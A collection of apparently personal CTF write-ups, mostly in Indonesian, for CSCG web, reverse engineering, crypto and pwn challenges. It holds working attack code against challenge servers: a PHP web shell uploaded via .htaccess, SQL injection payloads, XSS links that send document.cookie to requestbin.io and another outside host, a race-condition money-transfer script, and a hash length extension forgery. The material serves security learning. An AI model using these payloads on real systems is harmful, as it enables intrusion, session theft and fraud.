# Web
## File Upload
- bypass admin user using:
```php
$sql = "SELECT id FROM fileupload_users WHERE BINARY username = ?";
```
the itended solution is using race condition, but we can use .htaccess upload instead.
```python
import requests, base64, urllib.parse

URL = "https://a523f8ffc5b10aae0e457a2e-file-upload.challenge.master.cscg.live:31337/"
PHPSESSID = "698d8f99b86410cb6f9d0f24667166dc"
headers = {
    'Cookie': 'PHPSESSID=' + PHPSESSID
}

def backdoor():
    payload_htaccess = """AddType application/x-httpd-php .txt
    php_value auto_prepend_file "php://filter/convert.base64-decode/resource=payload.txt\""""

    payload = "<?php system($_GET['cmd']); ?>"
    payload = base64.b64encode(payload.encode('utf-8')).decode('utf-8')
    
    files = {
        'fileToUpload': (
            'payload.txt', 
            payload,
        )
    }

    requests.post(URL + 'upload.php', files = files, headers = headers)
    files = {
        'fileToUpload': (
            '.htaccess', 
            payload_htaccess,
        )
    }
    requests.post(URL + 'upload.php', files = files, headers = headers)

def main():
    backdoor()
    while True:
        cmd = input("$ ")
        cmd = urllib.parse.quote_plus(cmd)
        r = requests.get(URL + f'uploads/payload.txt?cmd={cmd}', headers = headers)
        print(r.text)
    
if __name__ == "__main__":
    main()
```
## Intro to Web 1
- Flag 1 dan 3 ada di renspons-nya
- Untuk mendapatkan flag kedua kita harus merubah variabel "countDownTime" bernilai 0

## Intro to Web 2
### flag ke-1
- hanya perlu mengubah nilai vaariable di console
### flag ke-2
- merubah post request agar dapat flag.txt
### flag ke-3
- merubah get request agar dapat flag.txt
### flag ke-4
```http
GET /burn-after-reading-6461316.php?authorized=true HTTP/1.1
Host: 054c99d8156c1cce71d3c1be-intro-web-2.challenge.master.cscg.live:31337
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```
## Intro to Web 3
### flag ke-1
- Masukkan null
https://en.wikipedia.org/wiki/JSON#Data_types
### flag ke-2
- Bisa dengan mengeset "OFFSET" untuke mencari user admin
```
The reason you are logging in as iwasfirstlol is because that SQL query returns all of the users and the PHP script simply takes the first one.
So how do you get around this? Well, there are multiple ways to go about this, and I'll give you example solutions for each of them:

Skip the first entry. If that doesn't work, skip the first two entries, and so on...
' OR true OFFSET 1 --
        
Put in a filter that only returns admins.
' OR is_admin=true --
        
Add artificial entries to the query, with an arbitrary username and admin privileges.
' UNION SELECT 'whatever',true --
        
Or - and this is the really big one - do the same as above but actually also leak the admin username and password from the database.
' UNION SELECT username,is_admin FROM users WHERE is_admin=true --
' UNION SELECT password,is_admin FROM users WHERE is_admin=true --
        
(Go ahead and try this. You'll notice that you're now seeing the admin's password as the "username".)
```
### flag ke-3
- flag bisa diambil dengan cara meredirect halaman ke "requestbin.io" menyeratakan cookienya, agar kita bisa mengambil cookie si admin
- https://requestbin.io/ 
```php
<script>window.location.replace("https://requestbin.io/1bcvn461" + "?"+ document.cookie)</script>
```

**session-id:** d82bbb0739fc1493b5625186b6e5faa7bfb6da35b485c468a13d703b432db500

## Cyberchef
### Penyelesaian
ada link aneh di atas kanan
```
http://https://bc8778acf8bbb216009696e7-cyberchef.challenge.master.cscg.live:31337/#recipe=JPath_expression('$..%5B?((%7B__proto__:%5B%5D.constructor%7D).constructor(%22self.postMessage(%7Baction:%5C'bakeComplete%5C',data:%7BbakeId:1,dish:%7Btype:1,value:%5C'%5C'%7D,duration:1,error:false,id:undefined,inputNum:2,progress:1,result:%5C'%3Ciframe/onload%3Dfetch(`https://requestbin.io/x44q83x4?${document.cookie}`)%3E%5C',type:%20%5C'html%5C'%7D%7D);%22)();)%5D','%5C%5Cn')&input=W3t9XQ
```
ternyata vulnerabilitynya xss dong, kita bisa membuat admin memberikan flagnya dengan link phising
https://requestbin.io/

### POC 
But this can be easily bypassed with the statement below.
```js
var obj = {__proto__:[].constructor};
// undefined
typeof obj
// 'object'
obj.constructor
// ƒ Function() { [native code] }
```
The object has a function in their `__proto__` attribute returns constructor of function when their constructor referenced even though its operated value with typeof operator returns `object`.
```js
var evaluate = require('static-eval');
var parse = require('esprima').parse;
 
var src = `({__proto__:[].constructor}).constructor('console.log(1337)')()`;
var ast = parse(src).body[0].expression;
 
evaluate(ast); // This prints "1337"
```
So this can be used to bypass restriction of static-eval.  
And It leads to XSS vulnerability in Cyberchef application.
```js
https://gchq.github.io/CyberChef/#recipe=JPath_expression('$..%5B?((%7B__proto__:%5B%5D.constructor%7D).constructor(%22self.postMessage(%7Baction:%5C'bakeComplete%5C',data:%7BbakeId:1,dish:%7Btype:1,value:%5C'%5C'%7D,duration:1,error:false,id:undefined,inputNum:2,progress:1,result:%5C'%3Ciframe/onload%3Dalert(1337)%3E%5C',type:%20%5C'html%5C'%7D%7D);%22)();)%5D','%5C%5Cn')&input=W3t9XQ
```

```python
import requests

payload = "http://cyberchef:8000/#recipe=JPath_expression('$..%5B?((%7B__proto__:%5B%5D.constructor%7D).constructor(%22self.postMessage(%7Baction:%5C'bakeComplete%5C',data:%7BbakeId:1,dish:%7Btype:1,value:%5C'%5C'%7D,duration:1,error:false,id:undefined,inputNum:2,progress:1,result:%5C'%3Ciframe/onload%3Dfetch(`http://p6.is/flag?${document.cookie}`)%3E%5C',type:%20%5C'html%5C'%7D%7D);%22)();)%5D','%5C%5Cn')&input=W3t9XQ"

print(payload)

res = requests.post('http://1.230.253.91:8001/report', data = {
    'url': payload
}, allow_redirects = False)
```
### Referensi
https://blog.p6.is/writeups-for-hayyim-security-ctf-2022/
https://github.com/gchq/CyberChef/issues/1318
## Secure Bank
```php
$db = new SQLite3('bank.db');
```
https://497e26628f267446db264431-securebank.challenge.master.cscg.live:31337/bank.db
use sqlitebrowser to open the db
https://md5decrypt.net/
```
6579e96f76baa00787a28653876c6127 : johndoe
```
racer condition vulnerability
```python
import requests, threading

def transfer(url, cookie, post_param):
    requests.post(url, cookies=cookie, data=post_param)

amount = 1

while True:
    for i in range(0, 1):
        condition = i
        if condition == 1:
            source = "EU42SECB00051380016"
            destination = "EU88SECB00051380017"
        else:
            source = "EU88SECB00051380017"
            destination = "EU42SECB00051380016"
        url = "https://497e26628f267446db264431-securebank.challenge.master.cscg.live:31337/?page=transfer"
        cookie = {
            'PHPSESSID': 'fa8bae4534ef36ddd9304a495faeb9e6'
        }
        cookie2 = {
            'PHPSESSID': '0234cba451c7034c71040659dc4ba680'
        }
        post_param = {
            'source': source,
            'destination': destination,
            'amount': amount,
        }


        t1 = threading.Thread(target=transfer, args=(url, cookie, post_param))
        t2 = threading.Thread(target=transfer, args=(url, cookie2, post_param))
        t1.start()
        t2.start()
        t1.join()
        t2.join()
    amount *= 2
```
# Reverse Engineering
## Intro to Reverse Engineering 1
Kita menggunakan:
- dotnet
- ilspy (ekstensi VsCode)
- file
- python

```python
array = ['y', 'l', 'l', 'a', 'e', 'r']
array = "".join(array)
array = array[::-1]
print(array)
text = "Welcome to your 1st Reverse-Engineering Challenge. Take a Decompiler of your choice and check out the source code. :)"
text2 = text.split(' ')
text2 = text2[8] + "s_are_" + array
text = "_powerfull!"
print("CSCG{"+text2+text+"}")
``` 
# Crypto
## Authorization token
auth=eyJlbWFpbCI6ICJkaW1hcyIsICJmdWxsbmFtZSI6ICJkaW1hcyBkaW1hcyIsICJyb2xlIjogIkd1ZXN0IiwgInNpZ25hdHVyZSI6ICI0ZTg1NWJhNTEyZTU1NGQxOTc0ZjFkNWY5NzZjZTM0ZjljZWY3N2E3ODM0ZDRlYTE0NzRlZWE4ZjAxOGJlODBiIn0=

coba kita membikin session tanpa membikin "secretkeyfile.key"

coba kita tidak memasukkan value dari json sehingga tidak ada output yang tertulis di "/tmp/secure-secret.key"

kesimpulan
Saya sudah mendecode enkripsi dari cookies-nya tetapi masih belum bisa mendecode signaturenya

harus melihat signaturenya? susah kita harus mendapatkan kuncinya

sudah saya coba untuk mempengaruhi kode pythonnya menggunakan
```
{"email": "", "fullname": " ", "role": "Admin", "signature": ""+(hmac.new(unhexlify(open("/tmp/secure-secret.key", "r").read()), sign_data.encode(), "sha256").hexdigest())+""}
```

yang saya rubah menjadi hex, tapi tetap tidak bisa karena fungsi "json.loads" memparses itu sehingga mengakibatkan error

diwebsite ini menyatakan bahwa fungsi "os.urandom" benar benar random dan tidak ada cara untuk membypassnya dengan mudah
https://stackoverflow.com/questions/47514695/whats-the-difference-between-os-urandom-and-random
```php
<script>alert("dimas")</script>
<?php
system("pwd");
?>
```

ide lain
kita bisa saja menggunakan trik pada kode programmnya denga
```python
sign_data = token['email'] + token['role'] + token['fullname']
sign_data = "" + "Guest" + "Admin"
sign_data = "Guest" + "Admin" + ""
```
sehingga fungsi
```python
return hmac.new(key, sign_data.encode(), 'sha256').hexdigest()
```
akan menggenerate kode yang sama

```
{"email": "", "fullname": "Admin ", "role": "Guest", "signature": "1243ff35813b94ce0ce9cb6c829a50d8b429617b30938cf2f8ec8ec0bab3ccda"}
```
hmmm... tidak bisa karena di fullname masih ada spasi
Akhirnya saya menemukan solusinya
```python
sign_data = token['email'] + token['role'] + token['fullname']
sign_data = "Admin" + "Guest" + ""
sign_data = "" + "Admin" + "Guest"
```

eyJlbWFpbCI6ICJBZG1pbiIsICJmdWxsbmFtZSI6ICIgIiwgInJvbGUiOiAiR3Vlc3QiLCAic2lnbmF0dXJlIjogIjA3NmZhNDk4MGVlZTYxNTNjODZmZjZkZmQyNDNiZGYzZjdjZTMzM2Y0MDU2NmYyMmI3MjAzZWQyZTEzYTYyMzMifQ==

```
{"email": "Admin", "fullname": " ", "role": "Guest", "signature": "076fa4980eee6153c86ff6dfd243bdf3f7ce333f40566f22b7203ed2e13a6233"}
```
kalau dipikirkan jadi seperti ini
```python
sign_data = "Admin" + "Guest" + " "
sign_data = "" + "Admin" + "Guest "
```
spasinya jadi tidak terlalu mengganggu
```
{"email": "", "fullname": "Guest ", "role": "Admin", "signature": "076fa4980eee6153c86ff6dfd243bdf3f7ce333f40566f22b7203ed2e13a6233"}
```
decode menjadi base64
```
eyJlbWFpbCI6ICIiLCAiZnVsbG5hbWUiOiAiR3Vlc3QgIiwgInJvbGUiOiAiQWRtaW4iLCAic2lnbmF0dXJlIjogIjA3NmZhNDk4MGVlZTYxNTNjODZmZjZkZmQyNDNiZGYzZjdjZTMzM2Y0MDU2NmYyMmI3MjAzZWQyZTEzYTYyMzMifQ==
```
## Intro to Crypto 1
```python
#!/usr/bin/env pypy3

import os
from pydoc import plain
from sys import byteorder
from Crypto.Cipher import AES
from Crypto.Util import Counter
import hashlib

# Create a secret.py file with a variable `FLAG` for local testing :)
from secret import FLAG

secret_key = os.urandom(16)

def encrypt(plaintext, counter):
    m = hashlib.sha256()
    m.update(counter.to_bytes(8, byteorder="big"))

    alg = AES.new(secret_key, AES.MODE_CTR, nonce=m.digest()[0:8])
    ciphertext = alg.encrypt(plaintext)

    return ciphertext.hex()


def main():
    print("DES is broken, long live the secure AES encryption!")
    print("Give me a plaintext and I'll encrypt it a few times for you. For more security of course!")

    try:
        plaintext = bytes.fromhex(input("Enter some plaintext (hex): "))
    except ValueError:
        print("Please enter a hex string next time.")
        exit(0)
    
    for i in range(0, 255):
        print(f"Ciphertext {i:03d}: {encrypt(plaintext, i)}")
    
    print("Flag:", encrypt(FLAG.encode("ascii"), int.from_bytes(os.urandom(1), byteorder="big")))

if __name__ == "__main__":
    main()

```

### Penyelesaian
```python
from pwn import *
import re

# deactivate log
context.log_level = 'error'

# variable
flagLen = 69
testPlain = b'41'*flagLen

with remote('056326ddf83f762e9bd05987-intro-to-crypto-1.challenge.master.cscg.live', 31337, ssl=True) as p:

    p.recv(1000).decode()
    p.sendline(testPlain)
    out = p.recvall().decode()

out = out.split("\n")
flagEnc = out [-2].replace("Flag: ", "")
out = out[:-2]


posibleFlag = []
for i in range(len(out)):
    # replace "Cipertext xxx: " with ""
    # use regex to find the number
    out[i] = re.sub("Ciphertext \d{3}: ", "", out[i])
with open("decodeDump.txt", "w") as f:
    for i in range(len(out)):
        encrypted_test = binascii.unhexlify(out[i].strip())
        encrypted_flag = binascii.unhexlify(flagEnc.strip())
        blob = xor(encrypted_test, encrypted_flag)
        f.write(str(xor(binascii.unhexlify(testPlain), blob))+"\n")

with open("decodeDump.txt", "r") as f:
    dump = f.read()

print(re.findall("CSCG{.*}", dump))
```
### Referensi
https://www.youtube.com/watch?v=Gtfr1dBGzHg
https://news.ycombinator.com/item?id=910203
## Intro to Crypto 2
- Harus mencari cara bagaimna untuk mendapatkan "admin=true"
- 
### What if
```python
    token = generate_token(
        {
            "name": name,
            "admin": "false",
            "animal": animal,
        }
    )

```
Jika admin ada di tengah kita bisa memberikan input seperti ini untuk mendapatkan flagnya.
```
Enter your choice: 1
What is you name? dimas
What is your favorite animal? dog|admin=true
Here is your access token: bmFtZT1kaW1hc3xhZG1pbj1mYWxzZXxhbmltYWw9ZG9nfGFkbWluPXRydWV8bWFjPTVmOTg3MzU1M2NkMzZjZTU1M2NmZjIyM2YzZmRmM2YzNmI3ZGZhNzg=

        1. Register
        2. Show animal videos
        3. Show flag
        4. Exit
        
Enter your choice: 3
Enter access token: bmFtZT1kaW1hc3xhZG1pbj1mYWxzZXxhbmltYWw9ZG9nfGFkbWluPXRydWV8bWFjPTVmOTg3MzU1M2NkMzZjZTU1M2NmZjIyM2YzZmRmM2YzNmI3ZGZhNzg=
The flag is flag{this_is_the_flag}
```
### Orat oret
name=dimas|animal=dog|admin=false|mac=061c9159bd2e3c13ed608ceffa82b995a1b2842d

name=dimas|animal=dog|admin=false|mac=061c9159bd2e3c13ed608ceffa82b995a1b2842d|mac=061c9159bd2e3c13ed608ceffa82b995a1b2842d
### Program Penyelesaian

```sh
hashpump -s "e95f7de72118af06cc7006e4d27442be6d46ee7c" -d "name=dimas|animal=dog|admin=false" -a "|admin=true" -k 32
```

```sh
echo -e "name=dimas|animal=dog|admin=false\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x08|admin=true|mac=733ce0e2268f30ddb4a3af185de2546efe43175f" | base64
```

```python
import os
import pwn, base64
r = pwn.remote('8721b6dadc505428261a252c-intro-to-crypto-2.challenge.master.cscg.live', 31337, ssl=True)

r.recvuntil(b'Enter your choice: ')
r.send(b'1\n')
r.recv(4096)
r.send(b'dimas\n')
r.recv(4096)
r.send(b'cat\n')

out = base64.b64decode(r.recvline().decode().replace('Here is your access token: ', '')).decode()
token, mac = out.split('|mac=')
hashpump = os.popen(f'hashpump -s "{mac}" -d  "{token}" -a "|admin=true" -k 32')
out = hashpump.read().split('\n')

new_hash = base64.b64encode(eval(f"b'{out[1]}'") +b"|mac="+bytes(out[0], 'utf-8'))
r.recvuntil(b'Enter your choice: ')
r.send(b'3\n')
r.recv(4096).decode()
r.send(new_hash+b'\n')
print(r.recv(4096).decode())
```
### Referensi
https://news.ycombinator.com/item?id=910203
https://en.wikipedia.org/wiki/Length_extension_attack
## Intro to Crypto 3
```python
from z3 import *

with open("text", 'rb') as f:
    flag_enc = [int(x) for x in f.read().split(b'\n')]

A, B, state = BitVecs('A B state', 56)

s = Solver()


def gen_next_random():
    global state
    state = (state*A+B) & ((2**56)-1)
    return state & 0xff

keystream = [gen_next_random() for i in range(len(flag_enc))]

flag = [x ^ y for x, y in zip(flag_enc, keystream)]

for i, c in enumerate('CSCG{'):
    s.add(flag[i] == ord(c))


print(s.check())
print(s.model())

A, B, state = 63, 106, 64

keystream = [gen_next_random() for i in range(len(flag_enc))]

flag = [x ^ y for x, y in zip(flag_enc, keystream)]

print(''.join([chr(x) for x in flag]))
```

```python
import z3 as z

# Define z3 input variables

input_a = z.BitVec("input_a", 56) # A = ?
input_b = z.BitVec("input_b", 56) # B = ?
seed = z.BitVec("seed", 56)		  # Seed = ?

states = {f"state_{i}": z.BitVec(f"state_{i}", 56) for i in range(0, 139)} # State(i) = ?

# Construct z3 solver
s = z.Solver()

# Add regular state constraints
# First state is calculated using the seed
s.add(states[f"state_0"] == ((seed * input_a + input_b) & 0xffffffffffffff)) # State(0) == Seed * A + B

# All other states are the same constraint/expression just shifted by one state each time
for i in range(1, 139):
	s.add(states[f"state_{i}"] == ((states[f"state_{i - 1}"] * input_a + input_b) & 0xffffffffffffff)) # State(i) == State(i-1) * A + B

# Add known flag value state constraints
s.add((states[f"state_1"] & 0xff) == 42) 	# State(1) & 0xff == 42
s.add((states[f"state_2"] & 0xff) == 192) 	# State(2) & 0xff == 192
s.add((states[f"state_3"] & 0xff) == 170) 	# State(3) & 0xff == 170
s.add((states[f"state_4"] & 0xff) == 64) 	# State(4) & 0xff == 64
s.add((states[f"state_5"] & 0xff) == 42) 	# State(5) & 0xff == 42
s.add((states[f"state_138"] & 0xff) == 192) # State(138) & 0xff == 192
#print(s) # debug to print all state constraints

result = s.check()
print(result) # is model solvable with these constraints? "sat" - is solvable (satisfied), "unsat" - either something is wrong with the input or the system is not solvable (unsatisfied)

if result == z.sat:
	#print(s.model()) # print all resolved variables
	mod = s.model()
	values = [105,147,233,7,81,145,253,56,71,153,249,2,105,163,199,6,24,162,211,2,98,162,152,56,71,137,236,22,95,161,253,26,92,163,199,112,77,150,199,44,64,164,237,121,83,137,239,6,89,154,199,5,77,150,237,6,95,154,152,120,77,146,152,121,89,154,195,2,105,163,199,6,24,162,211,2,109,162,153,40,26,163,199,121,26,137,236,10,92,162,253,22,92,137,236,10,92,162,253,22,92,137,236,22,95,161,253,26,92,163,199,112,77,149,199,121,94,154,253,120,77,146,253,14,69,162,211,2,121,162,152,113,70,162,211,1,23,189]

	flag = ""
	for i in range(138): # Decrypt the flag with the calculated states
		flag = flag + chr(values[i] ^ (mod[states[f"state_{i + 1}"]].as_long() & 0xff))

	print("Flag: " + flag)
```
## Encryption as a Service
https://ioactive.com/wp-content/uploads/2015/07/ldc_tutorial.pdf
https://link.springer.com/content/pdf/10.1007/BF00630563.pdf
![](CTF_Solution_Writeup/Competition/earth.cscg.live/Bacaan/EaaS_solution/solve.py)
## Des Light
```python
#!/usr/bin/python3
# encoding: utf-8

import struct

########################################################################

def crack_keys(block, fbk):
    fbk_reversed = permute(fbk, 32, PERMUTATION_REVERSED)
    _426 = lambda  _i: (_i & 0x20) | ((_i & 0x10) >> 4) | ((_i & 0xF) << 1)
    sboxes = []
    for n in range(8):
        x = (fbk_reversed >> 28 - n * 4) & 0xF
        i1 = SUBSTITUTION_BOX[n].index(x)
        i2 = SUBSTITUTION_BOX[n].index(x, i1 + 1)
        i3 = SUBSTITUTION_BOX[n].index(x, i2 + 1)
        i4 = SUBSTITUTION_BOX[n].index(x, i3 + 1)
        sboxes.append([_426(i1), _426(i2), _426(i3), _426(i4)])
    expanded = permute(block, 32, EXPANSION)
    keys = []
    for k1 in sboxes[0]:
        for k2 in sboxes[1]:
            for k3 in sboxes[2]:
                for k4 in sboxes[3]:
                    for k5 in sboxes[4]:
                        for k6 in sboxes[5]:
                            for k7 in sboxes[6]:
                                for k8 in sboxes[7]:
                                    key = k1 << 42 | k2 << 36 | k3 << 30 | k4 << 24 | k5 << 18 | k6 << 12 | k7 << 6 | k8
                                    key = key ^ expanded
                                    keys.append(key)
    return keys

def cracker(plain, cipher):
    blocks = permute(struct.unpack('>Q', plain)[0], 64, INITIAL_PERMUTATION)
    blocks = blocks >> 32, blocks & 0xffffffff
    c = permute(struct.unpack('>Q', cipher)[0], 64, INITIAL_PERMUTATION)
    block0 = c & 0xFFFFFFFF
    block1 = c >> 32
    fbk1 = block0 ^ blocks[0]
    fbk2 = block1 ^ blocks[1]
    return crack_keys(blocks[1], fbk1), crack_keys(block0, fbk2)

def main():

    try:
        plaintext = bytes.fromhex(input("Enter the plaintext (hex): "))
        ciphertext = bytes.fromhex(input("Enter the ciphertext (hex): "))
        flag = bytes.fromhex(input("Enter the flag (hex): "))
    except ValueError:
        print("Please enter hex strings next time.")
        exit(0)

    if len(plaintext) < 16: 
        print("Plaintext should be at least 16 bytes")
        exit()

    keys1, keys2 = cracker(plaintext[0:8], ciphertext[0:8])
    keys3, keys4 = cracker(plaintext[8:16], ciphertext[8:16])
    keys1 = filter(lambda _k: _k in keys3, keys1)
    keys2 = filter(lambda _k: _k in keys4, keys2)
    
    iv = struct.unpack('>Q', flag[0:8])[0]
    flag = flag[8:]
    for key1 in keys1:
        for key2 in keys2:
            result = handle(flag, ((key1, key2),), iv, False, 0)
            if result.startswith(b'CSCG{'):
                print(result)


PERMUTATION_REVERSED = (
   8,  16, 22, 30, 12, 27, 1,  17, 
   23, 15, 29, 5,  25, 19, 9,  0, 
   7,  13, 24, 2,  3,  28, 10, 18, 
   31, 11, 21, 6,  4,  26, 14, 20,
)

########################################################################

def cbc(blocks, key, initial, encryption):
    if encryption:
        for block in blocks:
            initial = encode(block ^ initial, key, encryption)
            yield initial
    else:
        for block in blocks:
            initial, block = block, initial ^ encode(block, key, encryption)
            yield block

def ecb(blocks, key, encryption):
    for block in blocks:
        yield encode(block, key, encryption)

def encode(block, key, encryption):
    for k in key:
        block = encode_block(block, k, encryption)
        encryption = not encryption
    return block

def encode_block(block, derived_keys, encryption):
    block = permute(block, 64, INITIAL_PERMUTATION)
    block = block >> 32, block & 0xffffffff
    if not encryption:
        derived_keys = reversed(derived_keys)
    for key in derived_keys:
        fbk = f(block[1], key)
        block = block[1], block[0] ^ fbk
    return permute(block[1] << 32 | block[0], 64, INVERSE_PERMUTATION)

def f(block, key):
    block = permute(block, 32, EXPANSION) ^ key
    ret = 0
    for i, box in enumerate(SUBSTITUTION_BOX):
        i6 = block >> 42 - i * 6 & 0x3f
        ret = ret << 4 | box[i6 & 0x20 | (i6 & 0x01) << 4 | (i6 & 0x1e) >> 1]
    return permute(ret, 32, PERMUTATION)

def handle(message, key, initial, padding, encryption):
    # message = guard_message(message, padding, encryption)
    # initial = guard_initial(initial)

    blocks = (struct.unpack(">Q", message[i: i + 8])[0] for i in range(0, len(message), 8))

    if initial is None:
        # ECB
        encoded_blocks = ecb(blocks, key, encryption)
    else:
        # CBC
        encoded_blocks = cbc(blocks, key, initial, encryption)

    ret = b"".join(struct.pack(">Q", block) for block in encoded_blocks)
    return ret[:-ord(ret[-1:])] if not encryption and padding else ret

def permute(data, bits, mapper):
    ret = 0
    for i, v in enumerate(mapper):
        if data & 1 << bits - 1 - v:
            ret |= 1 << len(mapper) - 1 - i
    return ret

INITIAL_PERMUTATION = (
    57, 49, 41, 33, 25, 17, 9,  1,
    59, 51, 43, 35, 27, 19, 11, 3,
    61, 53, 45, 37, 29, 21, 13, 5,
    63, 55, 47, 39, 31, 23, 15, 7,
    56, 48, 40, 32, 24, 16, 8,  0,
    58, 50, 42, 34, 26, 18, 10, 2,
    60, 52, 44, 36, 28, 20, 12, 4,
    62, 54, 46, 38, 30, 22, 14, 6,
)

INVERSE_PERMUTATION = (
    39, 7,  47, 15, 55, 23, 63, 31,
    38, 6,  46, 14, 54, 22, 62, 30,
    37, 5,  45, 13, 53, 21, 61, 29,
    36, 4,  44, 12, 52, 20, 60, 28,
    35, 3,  43, 11, 51, 19, 59, 27,
    34, 2,  42, 10, 50, 18, 58, 26,
    33, 1,  41, 9,  49, 17, 57, 25,
    32, 0,  40, 8,  48, 16, 56, 24,
)

EXPANSION = (
    31, 0,  1,  2,  3,  4,
    3,  4,  5,  6,  7,  8,
    7,  8,  9,  10, 11, 12,
    11, 12, 13, 14, 15, 16,
    15, 16, 17, 18, 19, 20,
    19, 20, 21, 22, 23, 24,
    23, 24, 25, 26, 27, 28,
    27, 28, 29, 30, 31, 0,
)

PERMUTATION = (
    15, 6,  19, 20, 28, 11, 27, 16,
    0,  14, 22, 25, 4,  17, 30, 9,
    1,  7,  23, 13, 31, 26, 2,  8,
    18, 12, 29, 5,  21, 10, 3,  24,
)

SUBSTITUTION_BOX = (
    (
        14, 4,  13, 1,  2,  15, 11, 8,  3,  10, 6,  12, 5,  9,  0,  7,
        0,  15, 7,  4,  14, 2,  13, 1,  10, 6,  12, 11, 9,  5,  3,  8,
        4,  1,  14, 8,  13, 6,  2,  11, 15, 12, 9,  7,  3,  10, 5,  0,
        15, 12, 8,  2,  4,  9,  1,  7,  5,  11, 3,  14, 10, 0,  6,  13,
    ),
    (
        15, 1,  8,  14, 6,  11, 3,  4,  9,  7,  2,  13, 12, 0,  5,  10,
        3,  13, 4,  7,  15, 2,  8,  14, 12, 0,  1,  10, 6,  9,  11, 5,
        0,  14, 7,  11, 10, 4,  13, 1,  5,  8,  12, 6,  9,  3,  2,  15,
        13, 8,  10, 1,  3,  15, 4,  2,  11, 6,  7,  12, 0,  5,  14, 9,
    ),
    (
        10, 0,  9,  14, 6,  3,  15, 5,  1,  13, 12, 7,  11, 4,  2,  8,
        13, 7,  0,  9,  3,  4,  6,  10, 2,  8,  5,  14, 12, 11, 15, 1,
        13, 6,  4,  9,  8,  15, 3,  0,  11, 1,  2,  12, 5,  10, 14, 7,
        1,  10, 13, 0,  6,  9,  8,  7,  4,  15, 14, 3,  11, 5,  2,  12,
    ),
    (
        7,  13, 14, 3,  0,  6,  9,  10, 1,  2,  8,  5,  11, 12, 4,  15,
        13, 8,  11, 5,  6,  15, 0,  3,  4,  7,  2,  12, 1,  10, 14, 9,
        10, 6,  9,  0,  12, 11, 7,  13, 15, 1,  3,  14, 5,  2,  8,  4,
        3,  15, 0,  6,  10, 1,  13, 8,  9,  4,  5,  11, 12, 7,  2,  14,
    ),
    (
        2,  12, 4,  1,  7,  10, 11, 6,  8,  5,  3,  15, 13, 0,  14, 9,
        14, 11, 2,  12, 4,  7,  13, 1,  5,  0,  15, 10, 3,  9,  8,  6,
        4,  2,  1,  11, 10, 13, 7,  8,  15, 9,  12, 5,  6,  3,  0,  14,
        11, 8,  12, 7,  1,  14, 2,  13, 6,  15, 0,  9,  10, 4,  5,  3,
    ),
    (
        12, 1,  10, 15, 9,  2,  6,  8,  0,  13, 3,  4,  14, 7,  5,  11,
        10, 15, 4,  2,  7,  12, 9,  5,  6,  1,  13, 14, 0,  11, 3,  8,
        9,  14, 15, 5,  2,  8,  12, 3,  7,  0,  4,  10, 1,  13, 11, 6,
        4,  3,  2,  12, 9,  5,  15, 10, 11, 14, 1,  7,  6,  0,  8,  13,
    ),
    (
        4,  11,  2, 14, 15, 0,  8,  13, 3,  12, 9,  7,  5,  10, 6,  1,
        13, 0,  11, 7,  4,  9,  1,  10, 14, 3,  5,  12, 2,  15, 8,  6,
        1,  4,  11, 13, 12, 3,  7,  14, 10, 15, 6,  8,  0,  5,  9,  2,
        6,  11, 13, 8,  1,  4,  10, 7,  9,  5,  0,  15, 14, 2,  3,  12,
    ),
    (
        13, 2,  8,  4,  6,  15, 11, 1,  10, 9,  3,  14, 5,  0,  12, 7,
        1,  15, 13, 8,  10, 3,  7,  4,  12, 5,  6,  11, 0,  14, 9,  2,
        7,  11, 4,  1,  9,  12, 14, 2,  0,  6,  10, 13, 15, 3,  5,  8,
        2,  1,  14, 7,  4,  10, 8,  13, 15, 12, 9,  0,  3,  5,  6,  11,
    ),
)

########################################################################

if __name__ == "__main__": main()

```
# Pwn
## Intro to Pwn 1
### Cek cek
Inputkan perintah dibawah untuk melihat sekuriti mode yang dipakai C program
```sh
checksec pwn1
```
position independent executable (PIE), address programnya akan diset secara random di awalan
```
[*] '/home/wowon/Downloads/tmp/pwn1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Pertama saya melihat dimana "setvbuf"  berada
```sh
gdb ./pwn1
r
ctrl+c
print setvbuf
vmmap 0x7ffff7e34d10 # dynamic
```
Benar, address dari "setvbuf" ada, dan address space dari fungsi ini berada di dalam "libc"

>note: Segmentation Fault (also known as SIGSEGV and is usually **signal 11**) occur when the program tries to write/read outside the memory allocated for it or when writing memory which can only be read.In other words when the program tries to access the memory to which it doesn't have access to

Lets try to call a function inside libc , which then terminates our process normally. The exit function would be a good candidate. The debugger can locate that function with a simple call

Sekarang kita test dengan memanggil funsi "exit" yang ada di dalam "libc". dan jika benar bisa, program tidak akan mengeluarkan error.
```
print exit
```
example out:
```
$2 = {void (int)} 0x7ffff7df6a70 <__GI_exit>
```

> note: As address space layout randomization (ASLR) is enabled on the system (it's basically enabled on any modern system, for good reasons...), we can't just plug and place that exit address in the next run. The libc would be loaded in a different address and we would end up in invalid memory again, crashing the application. But that's where the output of It's dangerous to go alone! Take this: 7ffff7e5af90 comes in: Since we know the current address of setvbuf , we can relatively locate the address of the exit function! A simple calculation for the setvbuf address minus the exit address in Python reveals the offset (don't forget we are still dealing with hexadecimal values):

>note: Kita juga bisa mengkakulasikan dimana letak dari "setvbuf" dengan fungsi seperti dibawah ini.
```python
print(hex(0x7ffff7e34d10 - 0x7ffff7df6a70))
0x3e2a0
```
Kita akan mengurangi address yang diberikan dengan address yang kita sudah dapatkan dari fungsi di atar, dan hasilnya kita bisa mendapatkan address dari fungsi "exit"
```python
print(hex(0x7ffff7e34d10 - 0x3e2a0))
